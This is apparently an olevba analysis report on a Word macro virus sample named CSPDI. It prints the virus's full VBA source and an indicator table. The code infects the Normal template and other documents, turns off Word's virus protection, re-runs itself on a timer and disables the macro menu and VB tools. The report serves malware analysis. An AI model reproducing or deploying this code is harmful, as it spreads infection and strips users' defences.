olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CSPDI-47fe521d53ab2771a853ec88a8d80880a432198c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CSPDI-47fe521d53ab2771a853ec88a8d80880a432198c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.CSPDI-47fe521d53ab2771a853ec88a8d80880a432198c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Public Sub MAIN()

Dim MyFile$
Dim OkExist
Dim TemplateName$
Dim internal
Dim xItem
Dim t
Dim s

s = "¸ß¾ÙµËÐ¡Æ½ÀíÂÛÎ°´óÆìÖÄ£¬°Ñ½¨ÉèÓÐÖÐ¹úÌØÉ«Éç»áÖ÷ÒåÊÂÒµÈ«ÃæÍÆÏò¶þÊ®Ò»ÊÀ¼Í"

'ÉèÖÃ´íÎóÏÝÚå
On Error Resume Next

'»ñÈ¡»î¶¯ÎÄ¼þÃû
If ActiveDocument.Path = "" Then
  MyFile$ = ActiveDocument.Name
Else
  MyFile$ = ActiveDocument.Path + "\" + ActiveDocument.Name
End If

If MyFile$ = "" Then GoTo Bye

'Õûµã³öÏÖÈÕÆÚÊ±¼äÐÅÏ¢
t = Format(Time, "hhmmss")
If Mid(t, 3, 2) = "00" And Not (Format(Date, "yyyy") = "1998" And Val(Format(Date, "mm")) < 9) Then
  MsgBox s, vbSystemModal, "CPSDI"
  'MsgBox Format(Date, "dddd,yyyy mmm dd") + "ÈÕ " + Format(Time, "hh") + "Ê±", vbSystemModal, "ÎÒµÄÌáÐÑ"
End If


' ÔÚÍ¨ÓÃÄ£°åÖÐ²éÕÒÊÇ·ñÓÐAutoOpenºê
OkExist = 0
For Each xItem In NormalTemplate.VBProject.VBComponents
  If xItem.Type = 1 And xItem.Name = "AutoOpen" Then
    OkExist = 1
    Exit For
  End If
Next xItem

' »ñÈ¡Í¨ÓÃÄ£°åµÄÎÄ¼þÃû
TemplateName$ = NormalTemplate.Path + "\" + NormalTemplate.Name

'ÉèÖÃÍ¨ÓÃÄ£°åµÄÎÄ¼þÊôÐÔÎªµµ°¸²¢½â³ýÆä²¡¶¾·À»¤¹¦ÄÜ
SetAttr TemplateName$, vbNormal
Options.VirusProtection = False

' ¿½±´AutoOpenºêµ½Í¨ÓÃÄ£°å
If OkExist <> 1 Then
    Application.OrganizerCopy Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
End If

' ÔÚ»î¶¯ÎÄµµÖÐ²éÕÒÊÇ·ñÓÐAutoOpenºê
OkExist = 0
For Each xItem In ActiveDocument.VBProject.VBComponents
  If xItem.Type = 1 And xItem.Name = "AutoOpen" Then
    OkExist = 1
    Exit For
  End If
Next xItem

'¿½±´AutoOpenºêµ½»î¶¯ÎÄµµ
If OkExist <> 1 Then
    Application.OrganizerCopy Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
End If

Bye:

' ÉèÖÃ×Ô¶¯ÔËÐÐAutoOpenºêµÄ¼ÆÊ±Æ÷
internal = "00:" + Str(10 - Val(Mid(t, 4, 1)))
Application.OnTime When:=Now + TimeValue(internal) - TimeValue("00:00:" + Right(t, 2)), Name:="AutoOpen", Tolerance:=60
DisableMacroMenu
DisableVBTools
End Sub
Public Sub DisableMacroMenu()
'Ê¹¹¤¾ß²Ëµ¥ÖÐµÄºêÃüÁî×éÊ§È¥×÷ÓÃ
Dim cb, xItem, xxItem, xxxItem
For Each cb In ActiveDocument.CommandBars
  If cb.Name = "Menu Bar" Then
    For Each xItem In cb.Controls
      If xItem.Caption = "¹¤¾ß(&T)" Then
        For Each xxItem In xItem.Controls
          If xxItem.Caption = "ºê(&M)" Then
            'xxItem.Enabled = True
            For Each xxxItem In xxItem.Controls
                xxxItem.Enabled = False
            Next xxxItem
            Exit Sub
          End If
        Next xxItem
      End If
    Next xItem
  End If
Next cb
End Sub
Public Sub DisableVBTools()
'Ê¹¹¤¾ßÀ¸ÖÐµÄVisual BasicÊ§È¥×÷ÓÃ
Dim cb
For Each cb In ActiveDocument.CommandBars
  If cb.Name = "Visual Basic" Then
     cb.Enabled = False
     Exit For
  End If
Next cb
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

